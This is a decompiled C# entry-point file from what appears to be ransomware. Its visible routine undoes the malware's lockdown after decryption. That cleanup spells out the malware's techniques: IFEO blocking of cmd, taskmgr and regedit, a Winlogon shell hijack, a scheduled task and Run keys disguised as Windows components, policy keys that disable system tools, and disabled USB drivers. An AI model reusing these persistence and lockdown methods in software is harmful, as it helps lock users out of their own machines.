using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x02000018 RID: 24
	[GeneratedCode("MyTemplate", "11.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class Form0 : WindowsFormsApplicationBase
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00002970 File Offset: 0x00000B70
		[EditorBrowsable(EditorBrowsableState.Advanced)]
		[STAThread]
		internal static void Main(string[] args)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$decryption_done.flag");
			string text2 = Path.Combine(Path.GetTempPath(), "$qyababcrypt_decryption_done.flag");
			bool flag = File.Exists(text) || File.Exists(text2);
			if (flag)
			{
				try
				{
					Form0.RemoveAllBlockingsAndPersistence();
				}
				catch
				{
				}
				Environment.Exit(0);
			}
			else
			{
				try
				{
					Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
				}
				finally
				{
				}
				Class1.Form0_0.Run(args);
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00002A14 File Offset: 0x00000C14
		private static void RemoveAllBlockingsAndPersistence()
		{
			try
			{
				string[] array = new string[]
				{
					"cmd.exe", "powershell.exe", "pwsh.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "mmc.exe", "control.exe", "eventvwr.exe", "perfmon.exe",
					"resmon.exe"
				};
				foreach (string text in array)
				{
					try
					{
						using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true))
						{
							bool flag = registryKey != null;
							if (flag)
							{
								registryKey.DeleteSubKeyTree(text, false);
							}
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true))
						{
							bool flag2 = registryKey2 != null;
							if (flag2)
							{
								registryKey2.DeleteSubKeyTree(text, false);
							}
						}
					}
					catch
					{
					}
				}
				try
				{
					using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
					{
						bool flag3 = registryKey3 != null;
						if (flag3)
						{
							registryKey3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
						}
					}
				}
				catch
				{
				}
				try
				{
					using (RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
					{
						bool flag4 = registryKey4 != null;
						if (flag4)
						{
							registryKey4.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,", RegistryValueKind.String);
						}
					}
				}
				catch
				{
				}
				try
				{
					Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"\\Microsoft\\Windows\\WindowsUpdate\\svchost\" /f")
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
					if (process != null)
					{
						process.WaitForExit(1000);
					}
				}
				catch
				{
				}
				string[] array3 = new string[] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" };
				string[] array4 = new string[] { "WindowsSecurityHealth", "EdgeUpdate", "*WindowsInit", "WindowsDefenderService" };
				foreach (string text2 in array3)
				{
					try
					{
						using (RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(text2, true))
						{
							bool flag5 = registryKey5 != null;
							if (flag5)
							{
								foreach (string text3 in array4)
								{
									try
									{
										registryKey5.DeleteValue(text3);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
				try
				{
					using (RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
					{
						bool flag6 = registryKey6 != null;
						if (flag6)
						{
							foreach (string text4 in array4)
							{
								try
								{
									registryKey6.DeleteValue(text4);
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
				string[] array8 = new string[] { "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" };
				string[] array9 = new string[] { "DisableTaskMgr", "DisableCMD", "DisableRegistryTools", "NoRun", "NoClose", "NoLogoff" };
				foreach (string text5 in array8)
				{
					try
					{
						using (RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey(text5, true))
						{
							bool flag7 = registryKey7 != null;
							if (flag7)
							{
								foreach (string text6 in array9)
								{
									try
									{
										registryKey7.DeleteValue(text6);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey(text5, true))
						{
							bool flag8 = registryKey8 != null;
							if (flag8)
							{
								foreach (string text7 in array9)
								{
									try
									{
										registryKey8.DeleteValue(text7);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
				foreach (string text8 in new string[] { "USBSTOR", "cdrom" })
				{
					try
					{
						using (RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\" + text8, true))
						{
							bool flag9 = registryKey9 != null;
							if (flag9)
							{
								registryKey9.SetValue("Start", 3, RegistryValueKind.DWord);
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00002148 File Offset: 0x00000348
		public Form0()
			: base(AuthenticationMode.Windows)
		{
			base.IsSingleInstance = true;
			base.EnableVisualStyles = false;
			base.SaveMySettingsOnExit = false;
			base.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00002173 File Offset: 0x00000373
		protected override void OnCreateMainForm()
		{
			base.MainForm = Class1.MyForms_0.loader;
		}
	}
}
